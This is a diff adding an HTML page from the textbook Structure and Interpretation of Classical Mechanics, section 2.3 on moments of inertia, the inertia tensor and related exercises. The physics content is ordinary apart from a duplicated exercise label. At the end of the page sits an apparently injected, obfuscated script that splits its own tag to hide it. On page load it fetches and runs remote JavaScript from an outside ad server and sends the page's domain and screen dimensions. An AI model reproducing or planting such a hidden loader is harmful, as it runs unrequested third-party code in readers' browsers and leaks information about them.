@@ -1,0 +1,193 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-22.html">previous</a></span><span>, <a href="book-Z-H-24.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_2.3"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_2.3">2.3&nbsp;&nbsp;Moments of Inertia</a></h2>
+<p>
+<a name="%_idx_1100"></a>
+<a name="%_idx_1102"></a>The rotational kinetic energy is the sum of the kinetic energy of each
+of the constituents of the rigid body.  We can rewrite the rotational
+kinetic energy in terms of the angular velocity vector and certain
+aggregate quantities determined by the distribution of mass in the
+rigid body.</p>
+<p>
+Substituting our representation of the relative velocity
+vectors into the rotational kinetic energy, we obtain
+<a name="EQUATION_2.12"></a></p>
+<div align=left><img src="chap2-Z-G-12.gif" border="0"></div>
+<p>
+We introduce an arbitrary rectangular coordinate system with origin at
+the center of rotation and with basis
+vectors <img src="chap2-Z-G-D-9.gif" border="0"><sub>0</sub>, <img src="chap2-Z-G-D-9.gif" border="0"><sub>1</sub>, and <img src="chap2-Z-G-D-9.gif" border="0"><sub>2</sub>, with the property
+that <img src="chap2-Z-G-D-9.gif" border="0"><sub>0</sub> &times; <img src="chap2-Z-G-D-9.gif" border="0"><sub>1</sub>  =  <img src="chap2-Z-G-D-9.gif" border="0"><sub>2</sub>.  The components of
+<img src="chap2-Z-G-D-8.gif" border="0"> on this coordinate system are <img src="chap1-Z-G-D-23.gif" border="0"><sup>0</sup>, <img src="chap1-Z-G-D-23.gif" border="0"><sup>1</sup>,
+and <img src="chap1-Z-G-D-23.gif" border="0"><sup>2</sup>.  Rewriting
+<img src="chap2-Z-G-D-8.gif" border="0"> in terms of its components, the rotational kinetic
+energy becomes
+<a name="EQUATION_2.13"></a></p>
+<div align=left><img src="chap2-Z-G-13.gif" border="0"></div>
+<p>
+with
+<a name="EQUATION_2.14"></a></p>
+<div align=left><img src="chap2-Z-G-14.gif" border="0"></div>
+<p> 
+<a name="%_idx_1104"></a>The quantities <em>I</em><sub><em>i</em><em>j</em></sub> are the components of the <em>inertia tensor</em>
+with respect to the chosen coordinate system.</p>
+<p>
+Note what a
+remarkable form the kinetic energy has taken.  All we have done is
+interchange the order of summations, but now the kinetic energy is
+written as a sum of products of components of the angular velocity vector,
+which completely specify how the orientation of the body is
+changing, and the quantity <em>I</em><sub><em>i</em><em>j</em></sub>, which depends solely on the
+distribution of mass in the body relative to the chosen coordinate
+system.</p>
+<p>
+We will deduce a number of properties of the inertia tensor.  First,
+we find a somewhat simpler expression for it.  The components of the
+vector <img src="chap2-Z-G-D-3.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> are ( <img src="chap1-Z-G-D-18.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub>, <img src="chap1-Z-G-D-13.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub>,
+<img src="chap2-Z-G-D-10.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> ).<a name="call_footnote_Temp_177" href="#footnote_Temp_177"><sup><small>3</small></sup></a>
+If we rewrite <img src="chap2-Z-G-D-3.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> as a sum over
+its components and simplify the elementary vector products of basis
+vectors, we can obtain the components of the inertia tensor.
+We can arrange the components of the inertia tensor to form the
+<a name="%_idx_1106"></a><a name="%_idx_1108"></a><em>inertia matrix</em> <strong><em>I</em></strong>, which looks like:
+<a name="EQUATION_2.15"></a></p>
+<div align=left><img src="chap2-Z-G-15.gif" border="0"></div>
+<p>
+The inertia tensor has real components and is symmetric: <em>I</em><sub><em>j</em><em>k</em></sub>  = 
+<em>I</em><sub><em>k</em><em>j</em></sub>.  </p>
+<p>
+<a name="%_idx_1110"></a>We define the <em>moment of inertia</em> <em>I</em> about a line by
+<a name="EQUATION_2.16"></a></p>
+<div align=left><img src="chap2-Z-G-16.gif" border="0"></div>
+<p>
+where <img src="chap1-Z-G-D-18.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub><sup><u>|</u></sup> is the perpendicular distance from the line
+to the constituent with index <img src="chap1-Z-G-D-21.gif" border="0">.  The diagonal components of the
+inertia tensor <em>I</em><sub><em>i</em><em>i</em></sub> are recognized as the moments of inertia about the
+lines coinciding with the coordinate axes <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>.  The off-diagonal
+components of the inertia tensor are called <a name="%_idx_1112"></a><em>products of inertia</em>.</p>
+<p>
+
+The rotational kinetic energy of a body depends on the distribution of
+mass of the body solely through the inertia tensor.  Remarkably, the
+inertia tensor involves only second-order moments of the mass
+distribution with respect to the center of mass.  We might have
+expected the kinetic energy to depend in a complicated way on all the
+moments of the mass distribution, interwoven in some complicated way
+with the components of the angular velocity vector, but this is not
+the case.  This fact has a remarkable consequence: for the motion of a
+free rigid body the detailed shape of the body does not matter.  If a
+<a name="%_idx_1114"></a>book and a banana have the same inertia tensor, that is, the same
+second-order mass moments, then if they are thrown in the same way the
+subsequent motion will be the same, however complicated that motion
+is. The fact that the book has corners and the banana has a stem do
+not affect the motion except for their contributions to the inertia
+tensor.  In general, the potential energy of an extended body is not
+so simple and does indeed depend on all moments of the mass
+distribution, but for the kinetic energy the second moments are all
+that matter!</p>
+<p>
+
+</p>
+<p><a name="%_thm_2.1"></a>
+<b>Exercise 2.1.</b>&nbsp;&nbsp;<strong>Rotational kinetic energy</strong><br>
+Show that the
+rotational kinetic energy can also be written 
+<a name="EQUATION_2.17"></a></p>
+<div align=left><img src="chap2-Z-G-17.gif" border="0"></div>
+<p>
+where <em>I</em> is the moment of inertia about the line through the center
+of mass with direction <img src="chap2-Z-G-D-11.gif" border="0">, and <img src="chap1-Z-G-D-23.gif" border="0"> is the
+instantaneous rate of rotation.
+</p>
+
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_2.2"></a>
+<b>Exercise 2.2.</b>&nbsp;&nbsp;<strong>Steiner's theorem</strong><br>
+
+<a name="%_idx_1116"></a>Let <em>I</em> be the moment of inertia of a body with respect to some given
+line through the center of mass.  Show that the moment of inertia <em>I</em>' with 
+respect to a second line parallel to the first is
+<a name="EQUATION_2.18"></a></p>
+<div align=left><img src="chap2-Z-G-18.gif" border="0"></div>
+<p>
+where <em>M</em> is the total mass of the body and <em>R</em> is the distance
+between the lines.
+</p>
+
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_2.3"></a>
+<b>Exercise 2.3.</b>&nbsp;&nbsp;<strong>Some useful moments of inertia</strong><br>
+Show that the moments of inertia of the following objects are as given:</p>
+<p>
+<strong>a</strong>.&nbsp;&nbsp;The moment of inertia of a sphere of uniform density with mass
+<em>M</em> and radius <em>R</em> about any line through the center is 
+(2/5) <em>M</em><em>R</em><sup>2</sup>.</p>
+<p>
+<strong>b</strong>.&nbsp;&nbsp;The moment of inertia of a spherical shell with mass
+<em>M</em> and radius <em>R</em> about any line through the center is 
+(2/3)<em>M</em><em>R</em><sup>2</sup>.</p>
+<p>
+<strong>c</strong>.&nbsp;&nbsp;The moment of inertia of a cylinder of uniform density with
+mass <em>M</em> and radius <em>R</em> about the axis of the cylinder is  (1/2) <em>M</em><em>R</em><sup>2</sup>.</p>
+<p>
+<strong>c</strong>.&nbsp;&nbsp;The moment of inertia of a thin rod of uniform density per
+unit length with mass <em>M</em> and length <em>L</em> about an axis perpendicular
+to the rod through the center of mass is  (1/12) <em>M</em><em>L</em><sup>2</sup>.</p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_2.4"></a>
+<b>Exercise 2.4.</b>&nbsp;&nbsp;<strong>Jupiter</strong><br>
+
+<a name="%_idx_1118"></a><a name="%_idx_1120"></a><br><strong>a</strong>.&nbsp;&nbsp;The density of a planet increases toward the center.
+Provide an argument that the
+moment of inertia of a planet is less than that of a sphere of uniform density of
+the same mass and radius.</p>
+<p>
+<strong>b</strong>.&nbsp;&nbsp;The density as a function of radius inside Jupiter is well
+approximated by
+</p>
+<div align=left><img src="chap2-Z-G-19.gif" border="0"></div>
+<p>
+where <em>M</em> is the mass and <em>R</em> is the radius of Jupiter.  Find the
+moment of inertia of Jupiter in terms of <em>M</em> and <em>R</em>.
+</p>
+
+<p></p>
+<p>
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_177" href="#call_footnote_Temp_177"><sup><small>3</small></sup></a> Here we avoid the more consistent notation (<img src="chap1-Z-G-D-18.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub><sup>0</sup>,
+<img src="chap1-Z-G-D-18.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub><sup>1</sup>, <img src="chap1-Z-G-D-18.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub><sup>2</sup>) for the components of
+<img src="chap2-Z-G-D-3.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub> because expressions
+involving powers of the components are awkward in this form.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-22.html">previous</a></span><span>, <a href="book-Z-H-24.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD3csQjapPH1ip8ko67OdAnBY%2f6ejMmTD1gXJkLZu1ywhF5U%2bR9KdhmTNnOQ0pLwgaK4n3KZz6O10PwRGnZ1jYlomfow%2bal8y2%2f7L%2fTP93kPhdd4JbFRaBWvx9g9q9ooKiztiGTKjjw0oGso%2fKLOUeTiNJCD1MuVIzmLZXpE%2fhROEdavNfng4j19WjT6KMCPqhgJFigvs6MscPciXlB%2fKsm5LvHTrRZ%2faNuX0VS9RyTuVKHjtZdYUGTHoi6el29XlWgf%2bgD8iOIG2sFV6l%2b5pIGwT0e0ltqWboNjnrf%2fNAVD%2fWfLf6%2fUTQBoCO%2fVCuNiiWX%2fnHpUj3fgVTxn%2bKPZ8UGcvWe%2f6En7UBGLjCnmzhOAinlGfiAMz1gVdNeqZtKq2BPCh82HLNPEw6apGxbX6MGZSDb5LS1gpQX1oXZMRaZqY8w19jfK%2fyeAmd6OOQ282FcfBp4gmBh7TJBIfOGVNiWw");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
